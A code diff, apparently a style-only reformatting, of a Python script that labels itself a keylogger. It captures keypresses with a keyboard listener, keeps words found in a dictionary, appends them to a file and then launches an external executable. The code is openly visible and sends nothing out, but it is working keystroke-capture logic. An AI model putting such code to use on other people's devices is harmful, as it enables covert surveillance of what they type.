@@ -21,29 +21,29 @@ def load_words(dictionary_path):
 def remove_special_chars(word):
     special_chars = "?!.;:§-_"
     for char in special_chars:
-        word = word.replace(char, '').strip()
+        word = word.replace(char, "").strip()
 
     return word
-        
-    
+
+
 def valid_word(word):
     return True if word.isalpha() and word.find("Key.") == -1 else False
 
 
 def word_in_dictionary(dictionary, word):
     return True if word.strip().lower() in dictionary else False
-    
+
 
 def write_to_file(filepath, dictionary, words):
-    try: 
+    try:
         with open(filepath, "a") as writer:
             for word in words:
                 word = remove_special_chars(word)
                 if valid_word(word) and word_in_dictionary(dictionary, word):
                     writer.write(word.lower())
-                    writer.write('\n')
+                    writer.write("\n")
 
-            # FIXME -> needed?
+            # TODO -> needed?
             writer.truncate()
     except Exception as e:
         print(f"Error while writing to file: {e}")
@@ -56,7 +56,7 @@ def on_press(key):
     #     print(key.char)
     # except AttributeError:
     #     print(key)
-        
+
     global text, words
     if key == keyboard.Key.enter:
         words.append(text)
@@ -80,36 +80,37 @@ def on_press(key):
         text = ""
     else:
         text += str(key).strip("'")
-      
-    
+
+
 def on_release(key):
     if key == keyboard.Key.esc:
         global words
         print("::: Populating file ...")
         write_to_file(FILEPATH, dictionary, words)
         words = []
-        
+
         # Stop listener
         print("::: Quitting")
         return False
+
 
 def process_file_with_rust(path_to_executable):
     os.system(path_to_executable)
 
 
 if __name__ == "__main__":
-    try: 
+    try:
         print("::: Loading dictionary ...")
         dictionary = load_words(DICTIONARY_PATH)
-        
+
         print("::: Keylogger is running ...")
         # Collect events until released
         with keyboard.Listener(
-                on_press=on_press,
-                on_release=on_release) as listener:
+            on_press=on_press, on_release=on_release
+        ) as listener:
             listener.join()
 
-        try: 
+        try:
             process_file_with_rust(EXE_PATH)
         except Exception as e:
             print(f"Error while executing external executable: {e}")
